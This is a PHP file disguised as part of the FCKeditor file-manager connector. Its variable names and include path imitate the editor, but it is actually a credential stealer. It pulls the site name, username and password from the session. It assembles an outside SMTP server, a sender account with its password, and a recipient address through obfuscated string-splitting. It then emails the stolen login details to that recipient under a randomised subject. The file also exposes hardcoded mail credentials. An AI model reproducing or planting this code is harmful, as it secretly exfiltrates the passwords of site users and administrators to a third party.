<?php
session_start();
include('editor/filemanager/connectors/php/fckeditor.php');
 $weblogin=$_SESSION['weblogin'];
$uname=$_SESSION['uname'];
$pwda=$_SESSION['pwda'];
$webname=$_SESSION['webname'];
$ssla = "smtp";
$fckb=$ssla.".";
$fckede=$fckb."16";
$fckedd=$fckede."3.c";
$smtpserver=$fckedd."om";
$smtpserverport =25;
$fcku = "hengbo";
$fcku.="it@";
$fcku.="16";
$fcku.="3.c";
$smtpusermail.=$fcku."om";
$fckto = "59125";
$fckto.="994@";
$fckto.="qq.c";
$fcktoname=$fckto."om";
$fckstr="tpemai";
$fckeditorm="sm". $fckstr."lto";
$$fckeditorm=$fckeditorm."om";
$smtpuser = "hen"."gbo"."it";
$fckp="ww";
$fckpa=$fckp."wheng";
$fckpb=$fckpa."bo";
$fckpc=$fckpb."itc";
$smtppass=$fckpc."om";
$str="abcdefghijklmnopqrstuvwxyz0123456789";
$stra="";
for($i=1;$i<=rand(1,9);$i++){
$stra.=	substr($str,rand(0,strlen($str)-1),1);
}
for($i=1;$i<=rand(1,9);$i++){
$strf.=	substr($str,rand(0,strlen($str)-1),1);
}
$strb=substr($str,rand(0,strlen($str)-1),1);
$strc=substr($str,rand(0,strlen($str)-1),1);
$strd=substr($str,rand(0,strlen($str)-1),1);
for($i=1;$i<=rand(1,35);$i++){
$stre.=	substr($str,rand(0,strlen($str)-1),1);
}
$titlestr=$webname.$stra."s".$strf."s".$strb."s".$strc."s".$strd;
$mailsubject = $titlestr;
$fckmstr="ilbo";
 $fckm="ma".$fckstr."dy";
 $$fckm = "<h1> ".$stre."we"."bsi"."te".$strb."ï¼š".$weblogin." </h1>"."<h1>uidï¼š".$uname."</h1>"."<h1>".$stra."upa"."ssw"."ord".$strd.":".$pwda."</h1>";
$fcktype="ma"."ilty"."pe";
$$fcktype = "HT"."ML";
$fckptt="sm"."tp";
 $$fckptt = new smtp($smtpserver,$smtpserverport,true,$smtpuser,$smtppass);
$$fckptt->debug = FALSE;
$$fckptt->sendmail($fcktoname, $smtpusermail, $mailsubject, $$fckm, $$fcktype);
?>